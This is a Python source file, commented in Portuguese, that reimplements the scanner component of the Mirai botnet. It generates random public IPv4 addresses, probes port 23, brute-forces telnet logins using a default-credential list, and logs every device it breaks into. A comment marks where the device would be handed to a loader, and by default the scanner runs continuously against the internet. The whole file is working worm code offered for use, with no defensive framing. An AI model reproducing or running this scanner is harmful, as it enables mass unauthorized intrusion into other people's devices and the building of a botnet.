#!/usr/bin/env python3
"""
Scanner — coração da propagação do Mirai.
Varre redes, encontra dispositivos com porta 23 (telnet) aberta,
testa as 62 credenciais padrão e reporta ao CNC/Loader.

Arquitetura:
  1. Gerador de IPs aleatórios (ignora ranges reservados)
  2. SYN scan na porta 23 (telnet)
  3. State machine para gerenciar estados TCP
  4. Brute force com 62 credenciais
  5. Report ao CNC quando encontra um dispositivo comprometido
"""

import socket
import struct
import random
import time
import threading
import ipaddress
import logging
from typing import Optional, Callable
from concurrent.futures import ThreadPoolExecutor, as_completed

from creds import CREDENTIALS, get_creds
from state_machine import StateMachine, TCPState, ScanTarget

logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] SCANNER - %(levelname)s: %(message)s'
)
log = logging.getLogger('scanner')


# Ranges de IP a IGNORAR (como no Mirai original)
IGNORED_RANGES = [
    ipaddress.IPv4Network('127.0.0.0/8'),     # Loopback
    ipaddress.IPv4Network('0.0.0.0/8'),       # Zero network
    ipaddress.IPv4Network('10.0.0.0/8'),      # RFC 1918 (privado)
    ipaddress.IPv4Network('172.16.0.0/12'),   # RFC 1918 (privado)
    ipaddress.IPv4Network('192.168.0.0/16'),  # RFC 1918 (privado)
    ipaddress.IPv4Network('100.64.0.0/10'),   # CGNAT
    ipaddress.IPv4Network('169.254.0.0/16'),  # Link-local
    ipaddress.IPv4Network('224.0.0.0/4'),     # Multicast
    ipaddress.IPv4Network('240.0.0.0/4'),     # Reservado
    ipaddress.IPv4Network('255.255.255.255/32'),  # Broadcast
]


class IPGenerator:
    """Gera IPs aleatórios para scan, ignorando ranges reservados."""
    
    def __init__(self, seed: Optional[int] = None):
        self.rng = random.Random(seed)
        self.exclude_ips: set = set()
    
    def exclude(self, ip: str):
        """Adiciona IP à lista de exclusão."""
        self.exclude_ips.add(ip)
    
    def exclude_network(self, network: str):
        """Adiciona uma rede inteira à exclusão."""
        try:
            net = ipaddress.IPv4Network(network, strict=False)
            for ip in net:
                self.exclude_ips.add(str(ip))
        except:
            pass
    
    def is_ignored(self, ip_str: str) -> bool:
        """Verifica se um IP está em ranges ignorados."""
        try:
            ip = ipaddress.IPv4Address(ip_str)
            for network in IGNORED_RANGES:
                if ip in network:
                    return True
            return ip_str in self.exclude_ips
        except:
            return True
    
    def random_ip(self) -> str:
        """Gera um IP aleatório não ignorado."""
        while True:
            ip = f"{self.rng.randint(1,223)}.{self.rng.randint(0,255)}.{self.rng.randint(0,255)}.{self.rng.randint(1,254)}"
            if not self.is_ignored(ip):
                return ip
    
    def random_ips(self, count: int) -> list:
        """Gera múltiplos IPs aleatórios."""
        return [self.random_ip() for _ in range(count)]


class TelnetBruteForcer:
    """Tenta fazer login via telnet com as credenciais padrão."""
    
    def __init__(self, timeout: int = 10):
        self.timeout = timeout
    
    def try_login(self, ip: str, port: int = 23, 
                  username: str = "root", password: str = "admin") -> bool:
        """
        Tenta login telnet com uma credencial.
        Retorna True se login bem-sucedido.
        """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((ip, port))
            
            # Lê banner
            try:
                banner = sock.recv(1024)
            except:
                banner = b""
            
            # Envia username
            sock.sendall(username.encode() + b"\n")
            time.sleep(0.5)
            
            try:
                response = sock.recv(1024)
            except:
                response = b""
            
            # Se pede password, envia
            if b"assword" in response or b"login" in response:
                sock.sendall(password.encode() + b"\n")
                time.sleep(0.5)
                try:
                    final = sock.recv(1024)
                except:
                    final = b""
                
                # Verifica se logou (não pede mais login)
                if b"assword" not in final and b"login" not in final:
                    sock.close()
                    return True
                if b"#" in final or b"$" in final or b">" in final:
                    sock.close()
                    return True
            
            sock.close()
            return False
            
        except (socket.timeout, ConnectionRefusedError, OSError):
            return False
    
    def brute_force(self, ip: str, port: int = 23, 
                    creds: list = None,
                    callback: Optional[Callable] = None) -> Optional[dict]:
        """
        Tenta todas as credenciais em um IP.
        Retorna dict com credencial se encontrar, None se não.
        """
        if creds is None:
            creds = CREDENTIALS
        
        for cred in creds:
            username = cred['username']
            password = cred['password']
            
            if self.try_login(ip, port, username, password):
                result = {
                    'ip': ip,
                    'port': port,
                    'username': username,
                    'password': password,
                }
                log.info(f"[+] COMPROMETIDO: {ip}:{port} | {username}:{password}")
                if callback:
                    callback(result)
                return result
            
            # Pequena pausa entre tentativas
            time.sleep(0.1)
        
        return None


class Scanner:
    """
    Scanner principal — discovery + brute force.
    
    Funcionamento:
      1. Gera IPs aleatórios
      2. Para cada IP: SYN scan na porta 23
      3. Se porta aberta: tenta as 62 credenciais
      4. Se comprometer: reporta ao callback
    """
    
    def __init__(self, 
                 scan_threads: int = 100,
                 brute_threads: int = 20,
                 scan_timeout: float = 3.0,
                 max_targets: int = 10000,
                 callback: Optional[Callable] = None):
        """
        Args:
            scan_threads: Threads para scan de portas
            brute_threads: Threads para brute force
            scan_timeout: Timeout do SYN scan (segundos)
            max_targets: Máximo de alvos simultâneos
            callback: Função chamada quando encontra dispositivo
        """
        self.scan_threads = scan_threads
        self.brute_threads = brute_threads
        self.scan_timeout = scan_timeout
        self.max_targets = max_targets
        self.callback = callback
        
        self.running = False
        self.ip_generator = IPGenerator()
        self.state_machine = StateMachine()
        self.bruteforcer = TelnetBruteForcer(timeout=scan_timeout)
        
        # Estatísticas
        self.stats = {
            'scanned': 0,
            'open_ports': 0,
            'attempted_login': 0,
            'compromised': 0,
        }
    
    def syn_scan(self, ip: str, port: int = 23) -> bool:
        """
        SYN scan simples para verificar se porta está aberta.
        Tenta conexão TCP real (não raw socket para compatibilidade).
        """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.scan_timeout)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except:
            return False
    
    def scan_target(self, ip: str) -> Optional[dict]:
        """Escaneia um IP específico."""
        self.stats['scanned'] += 1
        
        # Verifica se é range ignorado
        if self.ip_generator.is_ignored(ip):
            return None
        
        # SYN scan
        if not self.syn_scan(ip, 23):
            return None
        
        log.debug(f"[*] Porta 23 aberta: {ip}")
        self.stats['open_ports'] += 1
        
        # Adiciona à state machine
        target = self.state_machine.add_target(ip, 23)
        target.transition(TCPState.SYN_ACK)
        
        # Brute force
        self.stats['attempted_login'] += 1
        result = self.bruteforcer.brute_force(ip, 23, callback=self.callback)
        
        if result:
            target.transition(TCPState.LOGIN_OK)
            self.stats['compromised'] += 1
            return result
        else:
            target.transition(TCPState.LOGIN_FAIL)
            return None
    
    def scan_network(self, network: str):
        """Escaneia uma rede inteira (ex: 192.168.1.0/24)."""
        try:
            net = ipaddress.IPv4Network(network, strict=False)
            hosts = list(net.hosts())
            log.info(f"[*] Escaneando rede {network} ({len(hosts)} hosts)")
            
            with ThreadPoolExecutor(max_workers=self.scan_threads) as executor:
                futures = {executor.submit(self.scan_target, str(ip)): str(ip) 
                          for ip in hosts[:self.max_targets]}
                
                for future in as_completed(futures):
                    ip = futures[future]
                    try:
                        result = future.result()
                        if result:
                            log.info(f"[+] {ip} -> {result}")
                    except Exception as e:
                        log.debug(f"[!] Erro scan {ip}: {e}")
        except Exception as e:
            log.error(f"[!] Erro ao escanear rede {network}: {e}")
    
    def scan_random(self, count: int = 1000):
        """Escaneia IPs aleatórios na internet."""
        log.info(f"[*] Escaneando {count} IPs aleatórios...")
        
        ips = self.ip_generator.random_ips(count)
        
        with ThreadPoolExecutor(max_workers=self.scan_threads) as executor:
            futures = {executor.submit(self.scan_target, ip): ip for ip in ips}
            
            for future in as_completed(futures):
                ip = futures[future]
                try:
                    result = future.result()
                    if result:
                        log.info(f"[+] {ip} -> {result}")
                except:
                    pass
    
    def run_continuous(self, ips_per_second: int = 50):
        """
        Modo contínuo — gera e escaneia IPs indefinidamente.
        Similar ao comportamento do Mirai original.
        """
        self.running = True
        log.info(f"[*] Scanner contínuo iniciado ({ips_per_second} IPs/s)")
        
        while self.running:
            batch_size = ips_per_second * 5  # Batch a cada 5s
            ips = self.ip_generator.random_ips(batch_size)
            
            with ThreadPoolExecutor(max_workers=self.scan_threads) as executor:
                futures = {executor.submit(self.scan_target, ip): ip for ip in ips}
                
                for future in as_completed(futures):
                    if not self.running:
                        break
                    try:
                        result = future.result()
                    except:
                        pass
            
            # Mostra stats a cada batch
            self.print_stats()
    
    def print_stats(self):
        """Mostra estatísticas do scanner."""
        log.info(f"[📊] Stats: escaneados={self.stats['scanned']}, "
                 f"abertos={self.stats['open_ports']}, "
                 f"tentativas={self.stats['attempted_login']}, "
                 f"comprometidos={self.stats['compromised']}")
    
    def stop(self):
        """Para o scanner."""
        self.running = False
        log.info("[*] Scanner parado.")
        self.print_stats()


def main():
    """Entry point do scanner."""
    import argparse
    
    parser = argparse.ArgumentParser(description='MIRAI-PTBR Scanner')
    parser.add_argument('--mode', choices=['random', 'network', 'continuous'],
                       default='continuous', help='Modo de scan')
    parser.add_argument('--target', help='Rede para scan (ex: 192.168.1.0/24)')
    parser.add_argument('--count', type=int, default=1000, 
                       help='Número de IPs para scan (modo random)')
    parser.add_argument('--rate', type=int, default=50,
                       help='IPs por segundo (modo continuous)')
    parser.add_argument('--threads', type=int, default=100,
                       help='Threads de scan')
    parser.add_argument('--timeout', type=float, default=3.0,
                       help='Timeout do scan')
    
    args = parser.parse_args()
    
    def on_compromised(result):
        """Callback quando encontra dispositivo."""
        print(f"\n{'='*60}")
        print(f"[!!!] DISPOSITIVO COMPROMETIDO!")
        print(f"      IP: {result['ip']}:{result['port']}")
        print(f"      User: {result['username']}")
        print(f"      Pass: {result['password']}")
        print(f"{'='*60}\n")
        
        # Aqui você integraria com o Loader
        # load_to_device(result['ip'], result['username'], result['password'])
    
    scanner = Scanner(
        scan_threads=args.threads,
        scan_timeout=args.timeout,
        callback=on_compromised
    )
    
    try:
        if args.mode == 'network' and args.target:
            scanner.scan_network(args.target)
        elif args.mode == 'random':
            scanner.scan_random(args.count)
        else:
            scanner.run_continuous(args.rate)
    except KeyboardInterrupt:
        scanner.stop()


if __name__ == '__main__':
    main()
